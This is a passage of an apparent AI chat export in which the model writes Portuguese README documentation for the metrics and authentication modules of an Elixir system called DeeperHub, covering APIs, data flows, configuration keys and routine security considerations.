    *   **Responsabilidade:** Formatar métricas para serem expostas via uma API (ex: endpoint `/metrics` no formato Prometheus).
8.  **`DeeperHub.Shared.Metrics.ExportWorker` (GenServer):**
    *   **Responsabilidade:** Exportar métricas periodicamente para sistemas externos (se configurado).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/metrics/
├── metrics.ex                    # Fachada Pública
├── adapter.ex                    # Behaviour e Default Adapter
│
├── backends/                     # (Opcional) Adaptadores para backends específicos (Prometheus, StatsD)
│   └── prometheus_adapter.ex
│
└── supervisor.ex                 # Supervisor para processos do Core.Metrics (se houver)

lib/deeper_hub/shared/metrics/    # Componentes compartilhados do sistema de métricas
├── services/
│   ├── ets_metrics_service.ex    # Implementação ETS
│   ├── ets_metrics_counter.ex
│   └── ets_metrics_histogram.ex
│
├── alerts_system.ex              # Gerenciador de alertas
├── api_exporter.ex               # Exportador para API
├── collector_worker.ex           # Worker para coleta periódica
├── export_worker.ex              # Worker para exportação periódica
├── module_metrics.ex             # Coleta de métricas de módulos
├── system_monitor.ex             # Coleta de métricas do sistema (CPU, mem)
├── supervisor.ex                 # Supervisor para os workers e services de Shared.Metrics
├── telemetry.ex                  # (Opcional) Se o próprio sistema de métricas emitir telemetria sobre sua operação
└── types.ex                      # Definições de tipos comuns de métricas
```

### 3.3. Decisões de Design Importantes

*   **API Simples e Flexível:** A fachada `Core.Metrics` deve ser fácil de usar, com funções claras para cada tipo de métrica.
*   **Performance:** O registro de métricas deve ter um impacto mínimo no desempenho das operações principais. Operações custosas de agregação ou exportação devem ser assíncronas.
*   **Padronização de Nomes e Tags:** É crucial para a usabilidade e integração com ferramentas de monitoramento.
*   **Extensibilidade de Backend:** A arquitetura deve permitir a fácil adição de novos adaptadores para diferentes sistemas de monitoramento.

## 🛠️ 4. Casos de Uso Principais

*   **Monitorar Taxa de Requisições HTTP:**
    *   Um plug na pipeline Phoenix chama `DeeperHub.Core.Metrics.increment([:http, :requests, :total], 1, %{path: \"/api/users\", method: \"GET\"})`.
    *   Outro contador é incrementado para o status code: `DeeperHub.Core.Metrics.increment([:http, :requests, :status_codes], 1, %{code: \"200\"})`.
*   **Medir Latência de Banco de Dados:**
    *   `stop_timer_fn = DeeperHub.Core.Metrics.start_timer([:database, :query, :duration_ms], %{query_name: \"get_user_by_id\"})`
    *   Executa a query.
    *   `stop_timer_fn.()`
*   **Rastrear Número de Usuários Ativos:**
    *   Um worker periódico chama uma função no módulo `Accounts` que retorna o número de usuários ativos.
    *   O worker então chama `DeeperHub.Core.Metrics.gauge([:application, :users, :active_count], count)`.
*   **Alertar sobre Alto Uso de CPU:**
    *   `DeeperHub.Shared.Metrics.SystemMonitor` coleta o uso de CPU.
    *   `DeeperHub.Shared.Metrics.AlertsSystem` verifica essa métrica contra um limiar e, se excedido, dispara um alerta que pode ser enviado via `DeeperHub.Notifications`.

## 🌊 5. Fluxos Importantes

### Fluxo de Registro de Métrica (Ex: Contador)

1.  **Módulo Chamador:** Chama `DeeperHub.Core.Metrics.increment([:my_service, :event_processed], 1, %{type: \"A\"})`.
2.  **`DeeperHub.Core.Metrics` (Fachada):**
    *   Normaliza o nome da métrica (ex: para `\"deeper_hub.my_service.event_processed.count\"`).
    *   Normaliza as tags.
    *   Delega para `DeeperHub.Core.Metrics.Adapter.increment(normalized_name, value, normalized_tags)`.
3.  **`DeeperHub.Core.Metrics.Adapter` (ex: `DefaultMetricsAdapter` usando `EtsMetricsService`):**
    *   Chama `DeeperHub.Shared.Metrics.Services.EtsMetricsService.increment(normalized_name, value, normalized_tags)`.
4.  **`DeeperHub.Shared.Metrics.Services.EtsMetricsService`:**
    *   Usa `EtsMetricsCounter` para encontrar ou criar a entrada ETS para a métrica (combinando nome e tags) e incrementa seu valor.

## 📡 6. API (Funções Públicas da Fachada)

*(A documentação original de `DeeperHub.Core.MetricsFacade` e `DeeperHub.Shared.Metrics.MetricsFacade` já lista a maioria das funções necessárias. A ideia é consolidá-las sob `DeeperHub.Core.Metrics` e garantir clareza.)*

### 6.1. `DeeperHub.Core.Metrics.increment(name :: list(atom()) | String.t(), value :: integer() | nil, tags :: map() | nil) :: :ok`

*   **Descrição:** Incrementa uma métrica de contador.
*   **`@spec`:** `increment(name :: list(atom()) | String.t(), value :: integer() | nil, tags :: map() | nil) :: :ok`
*   **Parâmetros:**
    *   `name`: Nome da métrica (ex: `[:http, :requests]` ou `\"http.requests\"`).
    *   `value`: Valor a incrementar. (Padrão: `1`)
    *   `tags`: Mapa de tags para dimensionalidade. (Padrão: `%{}`)
*   **Exemplo:** `Metrics.increment([:orders, :processed], 1, %{region: \"us-east\"})`

### 6.2. `DeeperHub.Core.Metrics.decrement(name :: list(atom()) | String.t(), value :: integer() | nil, tags :: map() | nil) :: :ok`

*   **Descrição:** Decrementa uma métrica de contador.
*   *(Parâmetros e exemplo similares a `increment/3`)*

### 6.3. `DeeperHub.Core.Metrics.gauge(name :: list(atom()) | String.t(), value :: number(), tags :: map() | nil) :: :ok`

*   **Descrição:** Define o valor de uma métrica do tipo gauge.
*   **Exemplo:** `Metrics.gauge([:system, :memory, :usage_mb], 512.5, %{server_id: \"app-01\"})`

### 6.4. `DeeperHub.Core.Metrics.histogram(name :: list(atom()) | String.t(), value :: number(), tags :: map() | nil) :: :ok`

*   **Descrição:** Registra um valor em uma métrica de histograma (ou distribuição).
*   **Exemplo:** `Metrics.histogram([:api, :request_latency_ms], 123.4, %{endpoint: \"/users\"})`

### 6.5. `DeeperHub.Core.Metrics.record_timing(name :: list(atom()) | String.t(), value_microseconds :: non_neg_integer(), tags :: map() | nil) :: :ok`

*   **Descrição:** Atalho para registrar uma duração em um histograma, tipicamente em microssegundos ou milissegundos.
*   **Exemplo:** `Metrics.record_timing([:db, :query, :duration_us], 56789, %{query_name: \"get_user\"})`

### 6.6. `DeeperHub.Core.Metrics.start_timer(name :: list(atom()) | String.t(), tags :: map() | nil) :: function()`

*   **Descrição:** Inicia um timer e retorna uma função. Chamar a função retornada para o timer e registra a duração. A duração é geralmente registrada em microssegundos.
*   **Exemplo:**
    ```elixir
    stop_fn = Metrics.start_timer([:service_call, :duration_us], %{service: \"payment\"})
    # ... fazer a chamada ao serviço ...
    stop_fn.()
    ```

### 6.7. `DeeperHub.Core.Metrics.get_metric(name :: String.t(), tags :: map() | nil) :: {:ok, value :: term()} | {:error, :not_found}`

*   **Descrição:** Obtém o valor atual de uma métrica específica (principalmente para backends em memória).
*   *(`name` aqui seria a string normalizada completa, ex: `\"deeper_hub.http.requests.total.count\"`)*

### 6.8. `DeeperHub.Core.Metrics.get_metrics_summary(prefix :: String.t() | nil) :: {:ok, map()}`

*   **Descrição:** Obtém um resumo das métricas, opcionalmente filtrado por um prefixo.

## ⚙️ 7. Configuração

Configurações gerenciadas pelo `DeeperHub.Core.ConfigManager`:

*   `[:core, :metrics, :enabled]` (Boolean): Habilita/desabilita todo o sistema de métricas. (Padrão: `true`)
*   `[:core, :metrics, :adapter]` (Module): Módulo adaptador de métricas a ser usado (ex: `DeeperHub.Shared.Metrics.Services.EtsMetricsService`, `MyApp.PrometheusAdapter`). (Padrão: `DeeperHub.Shared.Metrics.Services.EtsMetricsService`)
*   `[:core, :metrics, :default_prefix]` (String): Prefixo padrão para todos os nomes de métricas (ex: `\"deeper_hub\"`). (Padrão: `\"deeper_hub\"`)
*   `[:core, :metrics, :ets_metrics_service, :cleanup_interval_ms]` (Integer): Intervalo para limpeza de métricas antigas no `EtsMetricsService`.
*   `[:core, :metrics, :collector_worker, :collection_interval_ms]` (Integer): Intervalo para o `CollectorWorker` coletar métricas de módulos. (Padrão: `60000`)
*   `[:core, :metrics, :export_worker, :export_interval_ms]` (Integer): Intervalo para o `ExportWorker` enviar métricas para backends externos. (Padrão: `30000`)
*   `[:core, :metrics, :export_worker, :exporters]` (List de Maps): Configuração dos exportadores. Ex: `[%{adapter: MyApp.StatsDExporter, host: \"localhost\", port: 8125}]`
*   `[:core, :metrics, :alerts_system, :check_interval_ms]` (Integer): Intervalo para o `AlertsSystem` verificar regras de alerta. (Padrão: `60000`)
*   `[:core, :metrics, :alerts_system, :rules]` (List de Maps): Definição das regras de alerta.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configurações do sistema de métricas.
*   `DeeperHub.Core.Logger`: Para logging de operações internas do sistema de métricas.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar os processos de métricas (workers, GenServers).
*   `DeeperHub.Shared.Utils`: Para utilitários de nomeação e manipulação de tags.

### 8.2. Bibliotecas Externas

*   Pode depender de bibliotecas de clientes para sistemas de métricas específicos (ex: `Exometer` (embora talvez seja um backend próprio), `Prometheus.Ex`, `Statix`).
*   `Telemetry` e `Telemetry.Metrics` (Elixir): Para uma base de instrumentação, especialmente se os adaptadores se integrarem com `Telemetry.Metrics`.

## 🤝 9. Como Usar / Integração

**Registrando um contador:**
```elixir
alias DeeperHub.Core.Metrics

def handle_new_user(params) do
  # ... lógica ...
  Metrics.increment([:users, :registered], 1, %{source: params.registration_source})
end
```

**Medindo a duração de uma função:**
```elixir
alias DeeperHub.Core.Metrics

def process_payment(payment_id) do
  stop_timer_fn = Metrics.start_timer([:payments, :processing, :duration_us], %{payment_id: payment_id})
  
  result = do_actual_payment_processing(payment_id) # Função real
  
  stop_timer_fn.() # Registra a duração
  result
end
```

**Definindo um gauge:**
```elixir
alias DeeperHub.Core.Metrics

def update_active_connections_gauge(count) do
  Metrics.gauge([:connections, :active_total], count, %{type: \"websocket\"})
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se os diferentes tipos de métricas (`increment`, `gauge`, `histogram`, `timer`) são registrados corretamente pelo adaptador configurado.
*   Verificar se as tags são associadas corretamente.
*   Testar a obtenção de resumos e valores específicos de métricas (especialmente para adaptadores em memória).
*   Testar os workers (`CollectorWorker`, `ExportWorker`, `AlertsSystem`) para garantir que executam suas tarefas periodicamente e corretamente.
*   Localização: `test/deeper_hub/core/metrics/` e `test/deeper_hub/shared/metrics/`.

### 10.2. Métricas (do próprio sistema de Métricas - Meta-Métricas)

*   `deeper_hub.core.metrics.adapter.operations.count` (tags: `type` (`increment`, `gauge`, etc.), `adapter_name`, `status` (`:ok`, `:error`)): Número de operações de registro de métricas.
*   `deeper_hub.core.metrics.adapter.operations.duration_ms` (Histograma, tags: `type`, `adapter_name`): Duração das operações de registro.
*   `deeper_hub.core.metrics.collector_worker.runs.count` (tags: `status` (`:ok`, `:error`)): Número de execuções do coletor.
*   `deeper_hub.core.metrics.export_worker.runs.count` (tags: `exporter_name`, `status` (`:ok`, `:error`)): Número de execuções do exportador.
*   `deeper_hub.core.metrics.alerts_system.alerts_triggered.count` (tags: `rule_id`, `severity`): Número de alertas disparados.

### 10.3. Logs

*   **Nível INFO:** Inicialização do sistema de métricas, configuração de adaptadores, execução de workers.
*   **Nível WARNING:** Falha ao registrar uma métrica em um backend específico (com retentativa, se aplicável), falha na coleta de métricas de um módulo.
*   **Nível ERROR:** Falha crítica na inicialização, falha persistente em um adaptador de backend, erro na configuração de regras de alerta.

### 10.4. Telemetria

O próprio sistema de métricas pode emitir eventos Telemetry sobre suas operações internas, permitindo que outros sistemas de observabilidade (ou até mesmo ele próprio de forma recursiva, com cuidado) capturem esses dados.
*   `[:deeper_hub, :core, :metrics, :record, :start | :stop | :exception]`
    *   Metadados: `%{metric_name: name, type: type, tags: tags}`
*   `[:deeper_hub, :shared, :metrics, :collector_worker, :run, :start | :stop | :exception]`
*   `[:deeper_hub, :shared, :metrics, :export_worker, :run, :start | :stop | :exception]`
    *   Metadados: `%{exporter: exporter_name}`
*   `[:deeper_hub, :shared, :metrics, :alerts_system, :rule_check, :start | :stop | :exception]`
    *   Metadados: `%{rule_id: id}`
*   `[:deeper_hub, :shared, :metrics, :alerts_system, :alert_triggered]`
    *   Metadados: `%{rule_id: id, severity: severity, metric_name: name, value: value}`

## ❌ 11. Tratamento de Erros

*   **Falha no Adaptador de Backend:** Se um adaptador de backend (ex: Prometheus, StatsD) falhar ao registrar uma métrica, o erro deve ser logado, mas não deve impactar a aplicação principal. O sistema de métricas deve ser resiliente a falhas de backend.
*   **Configuração Inválida:** Erros na configuração de métricas ou regras de alerta devem ser logados claramente na inicialização.

## 🛡️ 12. Considerações de Segurança

*   **Exposição de Métricas:** Se as métricas forem expostas via um endpoint HTTP (ex: para Prometheus), este endpoint deve ser protegido adequadamente (ex: autenticação, restrição de IP) para evitar exposição de informações internas do sistema.
*   **Cardinalidade de Tags:** O uso excessivo de tags com alta cardinalidade (ex: `user_id` em todas as métricas) pode sobrecarregar alguns sistemas de backend de métricas. Use tags com sabedoria.
*   **Não Registrar Dados Sensíveis em Nomes/Tags:** Evite colocar informações sensíveis diretamente nos nomes das métricas ou como valores de tags.

## 🧑‍💻 13. Contribuição

*   Siga o padrão de nomenclatura hierárquico para novas métricas (ex: `deeper_hub.modulo.submodulo.acao.unidade`).
*   Use tags para adicionar dimensões e contexto, mas evite alta cardinalidade excessiva.
*   Para operações que podem variar em duração, use `start_timer/2` ou `histogram/3` em vez de apenas contadores.
*   Consulte a equipe de operações/SRE ao definir novas métricas importantes para garantir que elas possam ser efetivamente monitoradas e alertadas.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar mais adaptadores de backend (ex: Datadog, OpenTelemetry Collector).
*   [ ] Adicionar suporte para exemplars em métricas (especialmente para Prometheus).
*   [ ] Desenvolver uma UI simples para visualização de métricas básicas em tempo real (para desenvolvimento/depuração).
*   [ ] Melhorar a agregação de métricas no `EtsMetricsService` para suportar percentis de forma mais eficiente para histogramas.
*   [ ] Adicionar a capacidade de registrar métricas em lote para reduzir o overhead de chamadas individuais.

---

*Última atualização: 2025-05-11*

---

Pronto para o próximo? Talvez `DeeperHub.Auth` ou `DeeperHub.API`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos mergulhar no `DeeperHub.Auth`, um dos módulos mais complexos e críticos do sistema. Dada a quantidade de submódulos e funcionalidades já descritas na documentação original, este será um README extenso.

---

# Módulo: `DeeperHub.Auth` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Auth`

O módulo `DeeperHub.Auth` é o pilar central para todas as funcionalidades de **autenticação** e **autorização** no sistema DeeperHub. Ele é responsável por verificar a identidade dos usuários, proteger recursos, gerenciar sessões, emitir e validar tokens, e aplicar políticas de acesso.

Este módulo abrange uma vasta gama de mecanismos de segurança, desde o login tradicional com senha até métodos modernos como WebAuthn e Autenticação Multifator (MFA), além de integrar com sistemas de Controle de Acesso Baseado em Papéis (RBAC) e gerenciamento de permissões. Seu objetivo é garantir que apenas usuários autenticados e autorizados possam acessar os recursos e funcionalidades apropriadas do DeeperHub. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Autenticação de Usuários:**
    *   Login com email/senha (via `AuthService` e `LoginService`).
    *   Login com OAuth (via `DeeperHub.OAuth`).
    *   Login com WebAuthn (FIDO2) (via `DeeperHub.WebAuthn`).
    *   Autenticação Multifator (MFA) com suporte a TOTP, SMS (implícito), Push (implícito), Códigos de Recuperação (via `DeeperHub.MFA`).
    *   Autenticação com tokens de API (via `TokenService`).
*   **Gerenciamento de Sessões:**
    *   Criação, validação, invalidação (logout) e renovação de sessões de usuário (via `SessionManager`, `SessionService`).
    *   Suporte a sessões persistentes (\"lembrar-me\").
    *   Limpeza periódica de sessões expiradas (`SessionCleanupWorker`).
    *   Aplicação de políticas de sessão (duração máxima, timeout por inatividade, etc., via `DeeperHub.SessionPolicy`).
*   **Gerenciamento de Tokens:**
    *   Geração e validação de tokens JWT (acesso, refresh) (via `TokenService`, `JwtService`).
    *   Geração e validação de tokens opacos (API, recuperação de senha, verificação de email) (via `TokenService`).
    *   Rotação de tokens de refresh (via `TokenRotationService`).
    *   Blacklist de tokens revogados (via `TokenBlacklist` e `BlacklistService`).
*   **Autorização e Controle de Acesso:**
    *   Verificação de permissões baseada em papéis (RBAC) (via `DeeperHub.RBAC`, `PermissionService`, `RoleService`).
    *   Gerenciamento de papéis, permissões e hierarquias de papéis.
    *   Suporte a permissões temporárias.
*   **Recuperação de Conta:**
    *   Fluxo de \"esqueci minha senha\" com tokens de reset (via `DeeperHub.Recovery`, `PasswordResetService`).
    *   Verificação de email (via `DeeperHub.Recovery`, `EmailVerificationService`).
*   **Segurança de Credenciais:**
    *   Hashing seguro de senhas (via `PasswordAdapter` ou `DeeperHub.Shared.Encryption.HashingService`).
    *   Políticas de força de senha.
*   **Integrações de Segurança:**
    *   Limitação de Taxa (Rate Limiting) para endpoints de autenticação (via `RateLimitIntegration`).
    *   Registro de eventos de autenticação e autorização no sistema de Auditoria (via `AuditIntegration`).
    *   Publicação de eventos de domínio relacionados à autenticação no EventBus (via `EventIntegration`).
*   **Validação de Entradas:**
    *   Validação e sanitização de credenciais e tokens (via `Validation.AuthValidation`).

## 🏗️ 3. Arquitetura e Design

O módulo `DeeperHub.Auth` é uma fachada de alto nível que orquestra uma série de submódulos e serviços especializados. A complexidade é gerenciada através da separação de responsabilidades em componentes menores e mais focados.

### 3.1. Componentes Principais

**(Baseado na documentação original e na refatoração proposta)**

*   **`DeeperHub.Auth` (Fachada Pública):**
    *   Ponto de entrada principal para funcionalidades de autenticação e autorização.
    *   Delega para `DeeperHub.Auth.AuthService`.
*   **`DeeperHub.Auth.AuthService`:**
    *   Serviço central que coordena as operações de login, logout, validação de sessão/token, e verificação de permissões.
    *   Utiliza outros serviços especializados como `LoginService`, `SessionService`, `TokenService`, `PermissionService`, `RoleService`.
*   **`DeeperHub.Auth.Services.LoginService`:**
    *   Lida especificamente com a lógica de autenticação primária (ex: verificação de email/senha).
*   **`DeeperHub.Auth.SessionManager` (GenServer):**
    *   Gerencia o ciclo de vida das sessões de usuários (criação, validação, invalidação, renovação).
    *   Pode usar `DeeperHub.Auth.Schema.Session` para persistência.
*   **`DeeperHub.Auth.TokenService` (Pode ser `DeeperHub.Tokens.TokenFacadeUnified`):**
    *   Responsável por gerar, validar, revogar e rotacionar diferentes tipos de tokens (JWT, API, recuperação).
    *   Pode incluir subcomponentes como `JwtService`, `BlacklistService`, `TokenRotationService`.
*   **`DeeperHub.Auth.PermissionService` (ou integração com `DeeperHub.RBAC`):**
    *   Gerencia a definição de permissões e sua associação a papéis ou usuários.
*   **`DeeperHub.Auth.RoleService` (ou integração com `DeeperHub.RBAC`):**
    *   Gerencia a definição de papéis.
*   **`DeeperHub.MFA` (Módulo separado, mas fortemente acoplado):**
    *   `DeeperHub.MFA.MFAFacade` e seus serviços (`TOTPService`, `WebAuthnService` via `DeeperHub.WebAuthn`, `RecoveryCodeService`, `PushVerificationService`).
*   **`DeeperHub.OAuth` (Módulo separado, mas fortemente acoplado):**
    *   `DeeperHub.OAuth.OAuthFacadeUnified` e seus serviços para autenticação com provedores externos.
*   **`DeeperHub.Recovery` (Módulo separado, mas fortemente acoplado):**
    *   `DeeperHub.Recovery.RecoveryFacadeUnified` para recuperação de senha e verificação de email.
*   **Schemas Ecto:**
    *   `DeeperHub.Auth.Schema.Permission`
    *   `DeeperHub.Auth.Schema.Role`
    *   `DeeperHub.Auth.Schema.RolePermission`
    *   `DeeperHub.Auth.Schema.UserPermission`
    *   `DeeperHub.Auth.Schema.UserRole`
    *   `DeeperHub.Auth.TokenSchema` (ou `DeeperHub.Tokens.Schema.ApiToken` e `TokenBlacklist`)
    *   `DeeperHub.Auth.TemporaryPassword` (ou `DeeperHub.TemporaryPassword.Schema.TempPassword`)
*   **Workers:**
    *   `DeeperHub.Auth.Workers.SessionCleanupWorker`
    *   `DeeperHub.Auth.Workers.TokenCleanupWorker`
*   **Integrações:**
    *   `DeeperHub.Auth.Integrations.AuditIntegration`: Para logs de auditoria.
    *   `DeeperHub.Auth.Integrations.EventIntegration`: Para eventos de domínio.
    *   `DeeperHub.Auth.RateLimitIntegration`: Para limitar tentativas de autenticação.
*   **Validação:**
    *   `DeeperHub.Auth.Validation.AuthValidation`: Para validar entradas.

### 3.2. Estrutura de Diretórios (Proposta Consolidada)

```
lib/deeper_hub/auth/
├── auth.ex                         # Fachada Pública
├── auth_service.ex                 # Serviço Coordenador
│
├── services/
│   ├── login_service.ex
│   └── password_adapter.ex         # (Se for distinto de PasswordService)
│   # Outros serviços específicos de Auth que não se encaixam em MFA, OAuth, etc.
│
├── session_manager.ex              # GenServer para gerenciamento de sessões
├── session_service.ex              # Lógica de negócio para sessões
│
├── validation/
│   └── auth_validation.ex
│
├── integrations/
│   ├── audit_integration.ex
│   ├── event_integration.ex
│   └── rate_limit_integration.ex
│
├── workers/
│   ├── session_cleanup_worker.ex
│   └── token_cleanup_worker.ex     # (Se não estiver em DeeperHub.Tokens)
│
├── supervisor.ex                   # Supervisor para os processos de Auth
└── telemetry.ex                    # Telemetria específica do Auth
```
**Módulos relacionados que teriam suas próprias estruturas:**
`lib/deeper_hub/mfa/`
`lib/deeper_hub/oauth/`
`lib/deeper_hub/recovery/`
`lib/deeper_hub/rbac/` (incluindo schemas de Permission, Role, etc.)
`lib/deeper_hub/tokens/` (incluindo schemas de Token, Blacklist, etc.)
`lib/deeper_hub/web_authn/`
`lib/deeper_hub/session_policy/`
`lib/deeper_hub/security_questions/`

### 3.3. Decisões de Design Importantes

*   **Camada de Fachada Clara:** `DeeperHub.Auth` serve como o único ponto de entrada para o restante da aplicação.
*   **Serviços Especializados:** A lógica de autenticação, sessão, token, MFA, OAuth, etc., é dividida em serviços dedicados para manter a coesão e facilitar a manutenção.
*   **Estado Gerenciado por GenServers:** Componentes como `SessionManager` e o `TokenBlacklistService` (dentro de `DeeperHub.Tokens`) usam GenServers para gerenciar estado concorrente.
*   **Segurança por Padrão:** Práticas como hashing forte de senhas, uso de tokens seguros (JWTs assinados, tokens opacos com entropia suficiente), e proteção contra ataques comuns são incorporadas.
*   **Extensibilidade:** O uso de adaptadores (implícito nos serviços) e a arquitetura modular permitem a adição de novos métodos de autenticação ou políticas de segurança no futuro.

## 🛠️ 4. Casos de Uso Principais

*   **Login com Senha:** Usuário fornece email/senha. `Auth.login` -> `AuthService` -> `LoginService` verifica credenciais -> `PasswordAdapter` compara hash -> `SessionManager` cria sessão -> `TokenService` gera tokens.
*   **Login com Google (OAuth):** Usuário clica em \"Login com Google\". Redirecionado para `DeeperHub.OAuth` que interage com o Google -> `OAuth` autentica/cria usuário -> `AuthService` (ou `SessionManager`) cria sessão para o usuário DeeperHub.
*   **Registro de Chave de Segurança (WebAuthn):** Usuário adiciona uma chave de segurança. `DeeperHub.MFA` (via `WebAuthnService`) gerencia o fluxo de registro.
*   **Verificação de Acesso a Recurso:** Um controller de API verifica se o usuário tem permissão para acessar um endpoint. O controller chama `DeeperHub.Auth.authorize(user_id, resource, action)` -> `AuthService` -> `PermissionService` (ou `DeeperHub.RBAC`) verifica papéis e permissões.
*   **Recuperação de Senha:** Usuário solicita reset de senha. `DeeperHub.Recovery.RecoveryFacade` -> `PasswordResetService` gera token -> `TokenService` armazena token -> `Notifications` envia email. Usuário clica no link -> `PasswordResetService` verifica token -> `PasswordService` atualiza senha.
*   **Logout:** Usuário clica em logout. `Auth.logout` -> `SessionManager` invalida sessão -> `TokenService` (via `BlacklistService`) adiciona token de acesso à blacklist.

## 🌊 5. Fluxos Importantes

### 5.1. Fluxo de Login com Email e Senha (com MFA opcional)

1.  **Controller API/Web:** Recebe `email` e `password`.
2.  Chama `DeeperHub.Auth.login(email, password, ip_address, device_info, metadata)`.
3.  **`DeeperHub.Auth.AuthService`:**
    *   Valida entrada (`AuthValidation`).
    *   Verifica rate limit (`RateLimitIntegration`).
    *   Delega para `DeeperHub.Accounts.get_user_by_email(email)` para buscar o usuário.
        *   Se não encontrado, retorna `{:error, :invalid_credentials}`.
    *   Delega para `DeeperHub.Auth.Services.PasswordService.compare_password(user, password)`.
        *   Se a senha não bate, registra falha de login (`RateLimitIntegration`), retorna `{:error, :invalid_credentials}`.
    *   **Verifica se MFA é necessário para o usuário (via `DeeperHub.MFA.MFAPolicyService`).**
        *   Se sim, retorna `{:error, :mfa_required, %{user_id: user.id, available_methods: [...]}}`. O frontend/cliente deve então iniciar o fluxo MFA.
        *   Se não, prossegue.
    *   Chama `DeeperHub.Auth.SessionManager.create_session(user, context_info)` para criar uma sessão.
    *   Chama `DeeperHub.Auth.TokenService.generate_token_pair(user.id, %{session_id: session.id})` para gerar tokens de acesso e refresh.
    *   Publica evento `UserLoggedInEvent` (via `EventIntegration`).
    *   Registra evento de auditoria (`AuditIntegration`).
    *   Retorna `{:ok, %{user: user, session: session, access_token: access_token, refresh_token: refresh_token}}`.

### 5.2. Fluxo de Validação de Token de Acesso (em um Plug/Middleware)

1.  **Plug/Middleware:** Extrai o token de acesso do header `Authorization`.
2.  Chama `DeeperHub.Auth.validate_token(access_token)`.
3.  **`DeeperHub.Auth.AuthService`:**
    *   Delega para `DeeperHub.Auth.TokenService.validate_token(access_token)`.
4.  **`DeeperHub.Auth.TokenService` (usando `JwtService` e `BlacklistService`):**
    *   Verifica a assinatura do JWT.
    *   Verifica a data de expiração.
    *   Verifica se o token está na blacklist.
    *   Se tudo ok, extrai `user_id` e `session_id` das claims.
    *   Delega para `DeeperHub.Auth.SessionManager.validate_session(session_id)`.
5.  **`DeeperHub.Auth.SessionManager`:**
    *   Verifica se a sessão existe, está ativa e não expirou (considerando `SessionPolicy`).
    *   Se a sessão é válida, retorna `{:ok, session}`.
6.  **`DeeperHub.Auth.AuthService`:** Se tudo válido, retorna `{:ok, %{user_id: user_id, session_id: session_id, claims: claims}}` para o Plug.
7.  **Plug/Middleware:** Adiciona `current_user_id` e `session_id` à `conn.assigns`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Auth`)

*(Muitas funções já foram documentadas na seção de `AuthFacade` da documentação original. O foco aqui é na consolidação e clareza.)*

### 6.1. `DeeperHub.Auth.login(email :: String.t(), password :: String.t(), ip_address :: String.t() | nil, device_info :: map() | nil, metadata :: map() | nil) :: {:ok, AuthResponse.t()} | {:error, atom() | {atom(), map()}}`

*   **Descrição:** Autentica um usuário com email e senha.
*   **`AuthResponse.t()`:** `%{user: User.t(), access_token: String.t(), refresh_token: String.t(), session_id: String.t()}`.
*   **Retorno de Erro:**
    *   `{:error, :invalid_credentials}`
    *   `{:error, :user_locked}`
    *   `{:error, :mfa_required, %{user_id: String.t(), available_methods: list(atom())}}`
    *   `{:error, :rate_limited, retry_after_seconds :: non_neg_integer()}`

### 6.2. `DeeperHub.Auth.logout(access_token :: String.t(), opts :: keyword()) :: :ok | {:error, atom()}`

*   **Descrição:** Realiza logout do usuário, invalidando a sessão e o token de acesso.
*   **`opts`:**
    *   `:revoke_all_sessions_for_user` (boolean): Se `true`, invalida todas as sessões do usuário.
*   **Retorno:** `:ok` ou `{:error, :invalid_token | :session_not_found}`.

### 6.3. `DeeperHub.Auth.refresh_session_token(refresh_token :: String.t(), context :: map()) :: {:ok, AuthResponse.t()} | {:error, atom()}`

*   **Descrição:** Gera um novo par de tokens de acesso e refresh usando um token de refresh válido.
*   **`context`:** `%{ip_address: String.t(), user_agent: String.t()}`.

### 6.4. `DeeperHub.Auth.validate_token(access_token :: String.t()) :: {:ok, TokenClaims.t()} | {:error, atom()}`

*   **Descrição:** Valida um token de acesso.
*   **`TokenClaims.t()`:** `%{user_id: String.t(), session_id: String.t(), exp: integer(), ...}`.
*   **Retorno de Erro:** `:token_invalid`, `:token_expired`, `:session_invalid`, `:session_expired`.

### 6.5. `DeeperHub.Auth.authorize(user_id :: String.t(), resource :: String.t() | atom(), action :: atom(), resource_details :: map() | nil) :: :ok | {:error, :unauthorized}`

*   **Descrição:** Verifica se um usuário tem permissão para realizar uma ação em um recurso.
*   **`resource_details`:** Metadados sobre o recurso específico sendo acessado (ex: para verificações baseadas em propriedade).

### 6.6. `DeeperHub.Auth.get_user_permissions(user_id :: String.t()) :: {:ok, list(String.t())}` (Nova Funcionalidade Sugerida)

*   **Descrição:** Retorna uma lista consolidada de todas as permissões efetivas de um usuário.

## ⚙️ 7. Configuração

O módulo `Auth` e seus submódulos são extensivamente configurados via `DeeperHub.Core.ConfigManager`.

*   **`[:auth, :session, :default_duration_seconds]`**: Duração padrão das sessões. (Padrão: `86400` - 24 horas)
*   **`[:auth, :session, :idle_timeout_seconds]`**: Timeout de inatividade da sessão. (Padrão: `1800` - 30 minutos)
*   **`[:auth, :token, :jwt, :secret_key]`**: Chave secreta para assinar JWTs (DEVE ser configurada via variável de ambiente segura).
*   **`[:auth, :token, :jwt, :access_token_ttl_seconds]`**: TTL para tokens de acesso. (Padrão: `900` - 15 minutos)
*   **`[:auth, :token, :jwt, :refresh_token_ttl_seconds]`**: TTL para tokens de refresh. (Padrão: `2592000` - 30 dias)
*   **`[:auth, :token, :api_token, :default_ttl_days]`**: TTL padrão para tokens de API.
*   **`[:auth, :password, :min_length]`**: Comprimento mínimo da senha. (Padrão: `8`)
*   **`[:auth, :password, :require_uppercase]`**: (Boolean) Exigir maiúscula. (Padrão: `true`)
*   **`[:auth, :password, :require_lowercase]`**: (Boolean) Exigir minúscula. (Padrão: `true`)
*   **`[:auth, :password, :require_digit]`**: (Boolean) Exigir dígito. (Padrão: `true`)
*   **`[:auth, :password, :require_special_char]`**: (Boolean) Exigir caractere especial. (Padrão: `true`)
*   **`[:auth, :rate_limit, :login_attempts, :max_per_minute]`**: Limite de tentativas de login por minuto.
*   **`[:auth, :rate_limit, :login_attempts, :block_duration_seconds]`**: Duração do bloqueio após exceder tentativas.
